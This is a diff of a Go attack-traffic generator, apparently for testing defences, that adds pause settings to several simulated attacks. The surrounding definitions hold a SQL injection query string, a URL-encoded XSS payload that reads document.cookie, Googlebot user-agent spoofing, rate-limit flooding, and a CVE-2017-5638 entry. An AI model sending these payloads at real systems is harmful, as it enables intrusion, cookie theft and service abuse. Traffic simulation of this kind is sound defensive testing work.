@@ -123,13 +123,13 @@ func (p *program) Start(s service.Service) error {
 		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
-	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0,
+	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0, pause: 3,
 		maxRequests: 15, minRequests: 10, url: fmt.Sprintf("http://%s/quotes/", target),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
-	ratelimit = Attack{name: "RateLimit", method: "GET", maxNap: 0, minNap: 0,
+	ratelimit = Attack{name: "RateLimit", method: "GET", maxNap: 0, minNap: 0, pause: 3,
 		maxRequests: 50, minRequests: 2, url: fmt.Sprintf("http://%s/stockhistory/", target),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"}}
-	probe = Attack{name: "Probe", method: "GET", maxNap: 0, minNap: 0,
+	probe = Attack{name: "Probe", method: "GET", maxNap: 0, minNap: 0, pause: 2,
 		maxRequests: 25, minRequests: 15, url: fmt.Sprintf("http://%s/", target),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"}}
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
